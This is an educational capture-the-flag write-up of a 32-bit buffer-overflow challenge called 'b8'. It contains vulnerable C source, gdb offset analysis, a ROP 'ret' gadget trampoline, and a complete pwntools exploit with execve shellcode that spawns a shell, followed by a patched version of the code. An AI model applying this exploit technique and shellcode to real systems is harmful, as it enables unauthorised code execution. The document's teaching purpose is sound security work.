Let's see if this file has any binary hardening systems in place.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b8$ pwn checksec b8
[*] '/Hackery/escape/buf_ovf/b8/b8'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE
```

So that would be a no. Let's check out the code...

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b8$ cat b8.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

void the_horror()
{
	unsigned int ret_adr;
	char buf0[40];
	fgets(buf0, 100, stdin);
	ret_adr = __builtin_return_address(0);

	if ((ret_adr & 0xf0000000) == 0xf0000000)
	{
		printf("Don't you have anything better to do? Clearly not.\n");
		exit(0);
	}
	printf("That's it, if you don't get back to your work at %p, we will have to deploy the mechs.\n", ret_adr);
}

int main()
{
	printf("Corrective solutions aren't working. We might have to upgrade.\n");
	the_horror();
}
```

First off we see that it is pretty similar to the previous challenge, as it implements the same check as the previous problem. So we won't be able to directly hit the eip register with an address that could store our input, or from libc. However it does not have the strdup() call the previous one had, so we will not be able to simply call the eax register. However we can still push shellcode to the stack, and execute it if we find a way. We will have to implement a ROP (return oriented programming) exploit in order to execute shellcode that we push onto the stack. Thing is the check it does only checks the value of the eip register, not what's before after or anything else. If we were to push a ROP gadget to the eip register that ended with a "ret" instruction, the parameter for the return instruction will be the address directly after it since stacks grow towards lower addresses and our overflow works towards higher addresses. As a result the "ret" instruction will have the program jump to whatever instruction is placed immediatley after it. So we can just push shellcode to the program, hit the eip register to have a ROP gadget that just has the "ret" instruction, store the address of our input that has the shellcode immediately after it, and we should have a shell. One thing I would like to mention, typically with ROP before you return you will need to clean the stack by having the gadget use several "pop" instructions to clear the stack for the new code to execute properly. Here the shellcode will take care of it so we don't have to worry about it (you will in future challenges). Now let's find our ROP Gadget.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b8$ ROPgadget --binary b8 | grep ret
0x08048771 : adc al, 0x41 ; ret
0x08048407 : adc cl, cl ; ret
0x08048468 : add al, 8 ; add ecx, ecx ; ret
0x0804858f : add bl, dh ; ret
0x08048328 : add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x08048526 : add byte ptr [eax], al ; mov ecx, dword ptr [ebp - 4] ; leave ; lea esp, dword ptr [ecx - 4] ; ret
0x08048527 : add byte ptr [ebx - 0x723603b3], cl ; popal ; cld ; ret
0x08048465 : add eax, 0x80498c4 ; add ecx, ecx ; ret
0x0804846a : add ecx, ecx ; ret
0x08048405 : add esp, 0x10 ; leave ; ret
0x080484f7 : add esp, 0x10 ; nop ; leave ; ret
0x08048585 : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804832a : add esp, 8 ; pop ebx ; ret
0x0804876e : and byte ptr [edi + 0xe], al ; adc al, 0x41 ; ret
0x0804852a : cld ; leave ; lea esp, dword ptr [ecx - 4] ; ret
0x0804852e : cld ; ret
0x08048467 : cwde ; add al, 8 ; add ecx, ecx ; ret
0x08048529 : dec ebp ; cld ; leave ; lea esp, dword ptr [ecx - 4] ; ret
0x0804876c : dec ebp ; push cs ; and byte ptr [edi + 0xe], al ; adc al, 0x41 ; ret
0x0804830e : in al, dx ; or al, ch ; mov ebx, 0x81000000 ; ret
0x080484f6 : inc dword ptr [ebx - 0x366fef3c] ; ret
0x08048772 : inc ecx ; ret
0x0804876f : inc edi ; push cs ; adc al, 0x41 ; ret
0x0804858e : jbe 0x8048593 ; ret
0x08048584 : jecxz 0x8048511 ; les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x08048583 : jne 0x8048571 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804858d : lea esi, dword ptr [esi] ; ret
0x0804852c : lea esp, dword ptr [ecx - 4] ; ret
0x0804852b : leave ; lea esp, dword ptr [ecx - 4] ; ret
0x08048408 : leave ; ret
0x08048466 : les ebx, ptr [eax - 0x36fef7fc] ; ret
0x0804832b : les ecx, ptr [eax] ; pop ebx ; ret
0x08048586 : les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x08048406 : les edx, ptr [eax] ; leave ; ret
0x080484f8 : les edx, ptr [eax] ; nop ; leave ; ret
0x08048464 : mov byte ptr [0x80498c4], 1 ; leave ; ret
0x08048311 : mov ebx, 0x81000000 ; ret
0x080483d0 : mov ebx, dword ptr [esp] ; ret
0x08048528 : mov ecx, dword ptr [ebp - 4] ; leave ; lea esp, dword ptr [ecx - 4] ; ret
0x080484fa : nop ; leave ; ret
0x080483cf : nop ; mov ebx, dword ptr [esp] ; ret
0x080483cd : nop ; nop ; mov ebx, dword ptr [esp] ; ret
0x080483cb : nop ; nop ; nop ; mov ebx, dword ptr [esp] ; ret
0x0804859f : not dword ptr [edx] ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x08048587 : or al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret
0x0804830f : or al, ch ; mov ebx, 0x81000000 ; ret
0x08048402 : or bh, bh ; rol byte ptr [ebx - 0xc36ef3c], 1 ; ret
0x0804843c : or bh, bh ; rol byte ptr [ebx - 0xc36ef3c], cl ; ret
0x08048469 : or byte ptr [ecx], al ; leave ; ret
0x0804858b : pop ebp ; ret
0x08048588 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804832d : pop ebx ; ret
0x0804858a : pop edi ; pop ebp ; ret
0x08048589 : pop esi ; pop edi ; pop ebp ; ret
0x0804852d : popal ; cld ; ret
0x08048770 : push cs ; adc al, 0x41 ; ret
0x0804876d : push cs ; and byte ptr [edi + 0xe], al ; adc al, 0x41 ; ret
0x0804876a : push cs ; xor byte ptr [ebp + 0xe], cl ; and byte ptr [edi + 0xe], al ; adc al, 0x41 ; ret
0x08048316 : ret
0x0804841e : ret 0xeac1
0x08048404 : rol byte ptr [ebx - 0xc36ef3c], 1 ; ret
0x0804843e : rol byte ptr [ebx - 0xc36ef3c], cl ; ret
0x080483d1 : sbb al, 0x24 ; ret
0x0804876b : xor byte ptr [ebp + 0xe], cl ; and byte ptr [edi + 0xe], al ; adc al, 0x41 ; ret
```

So looking through this list, we see the gadget we want.

```
0x08048316 : ret
```

So we will replace the address stored in the eip register with 0x08048316. Now to find the offset.

```
gdb-peda$ disas the_horror
Dump of assembler code for function the_horror:
   0x0804849b <+0>:	push   ebp
   0x0804849c <+1>:	mov    ebp,esp
   0x0804849e <+3>:	sub    esp,0x38
   0x080484a1 <+6>:	mov    eax,ds:0x80498c0
   0x080484a6 <+11>:	sub    esp,0x4
   0x080484a9 <+14>:	push   eax
   0x080484aa <+15>:	push   0x64
   0x080484ac <+17>:	lea    eax,[ebp-0x34]
   0x080484af <+20>:	push   eax
   0x080484b0 <+21>:	call   0x8048350 <fgets@plt>
   0x080484b5 <+26>:	add    esp,0x10
   0x080484b8 <+29>:	mov    eax,DWORD PTR [ebp+0x4]
   0x080484bb <+32>:	mov    DWORD PTR [ebp-0xc],eax
   0x080484be <+35>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080484c1 <+38>:	and    eax,0xf0000000
   0x080484c6 <+43>:	cmp    eax,0xf0000000
   0x080484cb <+48>:	jne    0x80484e7 <the_horror+76>
   0x080484cd <+50>:	sub    esp,0xc
   0x080484d0 <+53>:	push   0x80485b0
   0x080484d5 <+58>:	call   0x8048360 <puts@plt>
   0x080484da <+63>:	add    esp,0x10
   0x080484dd <+66>:	sub    esp,0xc
   0x080484e0 <+69>:	push   0x0
   0x080484e2 <+71>:	call   0x8048370 <exit@plt>
   0x080484e7 <+76>:	sub    esp,0x8
   0x080484ea <+79>:	push   DWORD PTR [ebp-0xc]
   0x080484ed <+82>:	push   0x80485e4
   0x080484f2 <+87>:	call   0x8048340 <printf@plt>
   0x080484f7 <+92>:	add    esp,0x10
   0x080484fa <+95>:	nop
   0x080484fb <+96>:	leave  
   0x080484fc <+97>:	ret    
End of assembler dump.
gdb-peda$ b *the_horror+26
Breakpoint 1 at 0x80484b5
gdb-peda$ r
Starting program: /Hackery/escape/buf_ovf/b8/b8 
Corrective solutions aren't working. We might have to upgrade.
75395128
```

One wall of text later...

```
Breakpoint 1, 0x080484b5 in the_horror ()
gdb-peda$ x/s $ebp-0x34
0xffffd004:	"75395128\n"
gdb-peda$ info frame
Stack level 0, frame at 0xffffd040:
 eip = 0x80484b5 in the_horror; saved eip = 0x8048523
 called by frame at 0xffffd060
 Arglist at 0xffffd038, args: 
 Locals at 0xffffd038, Previous frame's sp is 0xffffd040
 Saved registers:
  ebp at 0xffffd038, eip at 0xffffd03c
```

And now to fight some bunny...

```
>>> 0xffffd03c - 0xffffd004
56
>>> 56 - 34
22
```

So we will be using the same shellcode from b5, so we will only need 22 characters worth of padding. We also have the relative location of the input (which if you were to run the exploit in gdb with that address it would work just fine). Here are the address I tried before I reached the correct address.

```
0xffffd004
0xffffd014
0xffffd024
```

With all of the information we have collected, I present my exploit.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b8$ cat exploit.py 
#Import pwntools
from pwn import *

#Star the target Process
target = process("./b8")

#Read first line of text
print target.recvline()

#Store shellcode in variab;e
shellcode = "\x6a\x18\x58\xcd\x80\x50\x50\x5b\x59\x6a\x46\x58\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80"

#Construct padding
offset = "1"*22

#Declare ROP gadget
ROP = p32(0x08048316)

#Declare address of our shellcode
adr = p32(0xffffd024)

#Construct the payload
payload = shellcode + offset + ROP + adr

#Write the payload to a file for gdb purposes
p = open("in", "w")
p.write(payload)

#Send the payload
target.sendline(payload)

#Drop to an interactive shell
target.interactive()
```

Let's test it out...

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b8$ python exploit.py 
[+] Starting local process './b8': Done
Corrective solutions aren't working. We might have to upgrade.

[*] Switching to interactive mode
That's it, if you don't get back to your work at 0x8048316, we will have to deploy the mechs.
$ ls
b8  b8.c  exploit.py  in  out  peda-session-b8.txt  peda-session-dash.txt
$ cat out
That's it, bring out the mechs. Just remember, you asked for this. Level Cleared!
$ exit
[*] Got EOF while reading in interactive
$ exit
[*] Process './b8' stopped with exit code 0
[*] Got EOF while sending in interactive
```

Just like that, we pwned the binary. You know what's next.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b8$ cat b8_secure.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

void the_horror()
{
	unsigned int ret_adr;
	char buf0[40];
	fgets(buf0, sizeof(buf0), stdin);
	ret_adr = __builtin_return_address(0);

	if ((ret_adr & 0xf0000000) == 0xf0000000)
	{
		printf("Don't you have anything better to do? Clearly not.\n");
		exit(0);
	}
	printf("That's it, if you don't get back to your work at %p, we will have to deploy the mechs.\n", ret_adr);
}

int main()
{
	printf("Corrective solutions aren't working. We might have to upgrade.\n");
	the_horror();
}



guyinatuxedo@tux:/Hackery/escape/buf_ovf/b8$ python -c 'print "0"*500' | ./b8_secure 
Corrective solutions aren't working. We might have to upgrade.
That's it, if you don't get back to your work at 0x8048523, we will have to deploy the mechs.
```

Just like that, we patched the binary.
